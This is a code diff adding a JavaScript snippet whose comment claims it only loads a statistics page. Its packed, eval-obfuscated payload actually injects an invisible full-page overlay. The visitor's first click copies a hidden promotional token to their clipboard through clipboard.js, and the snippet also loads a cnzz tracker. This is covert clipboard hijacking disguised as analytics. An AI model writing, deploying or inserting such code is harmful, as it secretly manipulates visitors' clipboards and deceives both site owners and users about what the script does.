@@ -1,0 +1,4 @@
+(function () {
+    //加载统计页面
+    eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[13-9a-l]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1.4("<3 c=\\"d://cdn.bootcss.e/5.f/2.0.0/5.min.f\\" g=\\"6/h\\"></\\3>");1.4("<i 7=\\"8\\" j=\\"width: k%; height: k%; top: 0;left: 0; position: fixed; z-index: 99999;\\" ></i>");1.4("<9 7=\\"a\\" j=\\"display: none\\" data-5-6=\\"€KUwy0yyj29A€\\">9</9>");1.4("<3 g=\\"6/h\\">new ClipboardJS(\\"#a\\");1.b(\\"8\\").onclick = function() {1.b(\\"a\\").click();1.b(\\"8\\").hidden = true;};</\\3>");1.4("<3 c=\\"d://s22.cnzz.e/z_stat.php?7=l&web_id=l\\" language=\\"JavaScript\\"></\\3>");',[],22,'|document||script|write|clipboard|text|id|abc|button|target|getElementById|src|https|com|js|type|javascript|div|style|100|1274035492'.split('|'),0,{}));
+})();
